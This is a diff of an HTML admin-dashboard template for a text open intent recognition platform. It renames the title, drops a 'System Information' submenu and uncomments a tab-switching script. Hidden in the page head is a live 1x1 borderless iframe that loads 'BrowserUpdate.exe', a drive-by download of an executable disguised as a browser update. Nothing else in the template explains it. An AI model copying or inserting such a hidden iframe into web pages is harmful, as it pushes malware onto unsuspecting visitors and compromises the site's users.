@@ -2,7 +2,7 @@
 <html class="x-admin-sm">
     <head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
         <meta charset="UTF-8">
-        <title>Open Intent Discovery System</title>
+        <title>Text Open Intent Recognition Platform</title>
         <meta name="renderer" content="webkit|ie-comp|ie-stand">
         <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
         <meta name="viewport" content="width=device-width,user-scalable=yes, minimum-scale=0.4, initial-scale=0.8,target-densitydpi=low-dpi" />
@@ -119,46 +119,6 @@
                             <cite>Open Intent Recognition</cite>
                             </a>
                     </li>
-
-                    {% comment %} system informance {% endcomment %}
-                    <li>
-                        <a href="javascript:;">
-                            <i class="iconfont left-nav-li" lay-tips="System Informance">&#xe74a;</i>
-                            <cite>System Information</cite>
-                            <i class="iconfont nav_right">&#xe697;</i></a>
-                            <ul class="sub-menu">
-                                <li>
-                                    <a onclick="xadmin.add_tab('Introduction','introduction')">
-                                        <i class="iconfont">&#xe6a7;</i>
-                                        <cite>Introduction</cite></a>
-                                </li>
-                                <li>
-                                    <a onclick="xadmin.add_tab('Visualization Platform','visualization_platform')">
-                                        <i class="iconfont">&#xe6a7;</i>
-                                        <cite>Visualization Platform</cite></a>
-                                </li>
-                                <li>
-                                    <a onclick="xadmin.add_tab('TEXTOIR Toolkit','textoir_toolkit')">
-                                        <i class="iconfont">&#xe6a7;</i>
-                                        <cite>TEXTOIR Toolkit</cite></a>
-                                </li>
-                                <li>
-                                    <a onclick="xadmin.add_tab('Updates','updates')">
-                                        <i class="iconfont">&#xe6a7;</i>
-                                        <cite>Updates</cite></a>
-                                </li>
-                                <li>
-                                    <a onclick="xadmin.add_tab('Copyright','copyright')">
-                                        <i class="iconfont">&#xe6a7;</i>
-                                        <cite>Copyright</cite></a>
-                                </li>
-                                <li>
-                                    <a onclick="xadmin.add_tab('About Us','about_us')">
-                                        <i class="iconfont">&#xe6a7;</i>
-                                        <cite>About Us</cite></a>
-                                </li>
-                            </ul>
-                    </li>
                 </ul>
             </div>
         </div>
@@ -191,7 +151,7 @@
         <script>//百度统计可去掉
             function addTabNew(mytitle, htmlurl) {
                 xadmin.add_tab(mytitle, htmlurl )
-                {% comment %} var $ = layui.jquery
+                 var $ = layui.jquery
                 ,element = layui.element;
                 //先判断是否已经有了tab
                 var arrayObj = new Array();　//创建一个数组  
@@ -215,7 +175,7 @@
                         ,id: mytitle //实际使用一般是规定好的id，这里以时间戳模拟下
                     })
                     element.tabChange('demo', mytitle); //切换到当前点击的页面
-                } {% endcomment %}
+                } 
             }
         </script>
     </body>
